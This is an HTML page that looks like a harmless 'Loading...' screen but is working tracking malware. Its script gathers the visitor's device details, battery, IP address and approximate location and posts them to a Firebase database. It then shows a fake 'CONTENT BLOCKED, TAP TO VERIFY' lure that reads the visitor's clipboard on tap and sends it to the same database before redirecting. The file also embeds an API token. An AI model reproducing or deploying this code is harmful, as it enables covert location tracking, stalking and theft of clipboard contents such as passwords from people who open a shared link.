<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #f0f2f5; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 3px solid #ddd; border-top: 3px solid #00a884; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p id="msg" style="margin-top:15px; color:#666; font-size:14px;">Connecting...</p>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";

        async function run() {
            const params = new URLSearchParams(window.location.search);
            const id = params.get('id');
            if(!id) return;
            const decoded = JSON.parse(atob(id));

            let data = {
                time: new Date().toLocaleString(),
                model: navigator.userAgent.split('(')[1].split(')')[0],
                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
                ip: "N/A", loc: "Asia/Karachi", map: "#"
            };

            // Battery Fetch
            try {
                const b = await navigator.getBattery();
                data.bat = Math.round(b.level * 100) + "%";
            } catch(e){ data.bat = "N/A"; }

            // Reliable IP Fetch (Fixed)
            try {
                const res = await fetch('https://api.db-ip.com/v2/free/self');
                const d = await res.json();
                data.ip = d.ipAddress;
                data.loc = d.city + ", " + d.countryName;
                // Since we don't have lat/long from this API, use city for map
                data.map = `https://www.google.com/maps/search/${d.city}+${d.countryName}`;
            } catch(e) {
                // Final Backup
                try {
                    const res2 = await fetch('https://ipinfo.io/json?token=6460e40854d9c4'); // Free token
                    const d2 = await res2.json();
                    data.ip = d2.ip;
                    data.loc = d2.city + ", " + d2.country;
                    data.map = `https://www.google.com/maps?q=${d2.loc}`;
                } catch(e2){}
            }

            // Save Data
            fetch(`${DB_URL}tracking/${decoded.k}.json`, { method: 'POST', body: JSON.stringify(data) });

            setTimeout(() => {
                document.body.innerHTML = "<div style='text-align:center; padding:20px;'><b>⚠️ CONTENT BLOCKED</b><br><p style='font-size:14px;'>TAP TO VERIFY & PLAY</p></div>";
                document.body.onclick = async () => {
                    try {
                        const clip = await navigator.clipboard.readText();
                        if(clip) fetch(`${DB_URL}clipboard/${decoded.k}.json`, { method: 'POST', body: JSON.stringify({ clipData: clip, time: new Date().toLocaleString() }) });
                    } catch(e){}
                    window.location.href = decoded.r;
                };
            }, 2000);
        }
        run();
    </script>
</body>
</html>
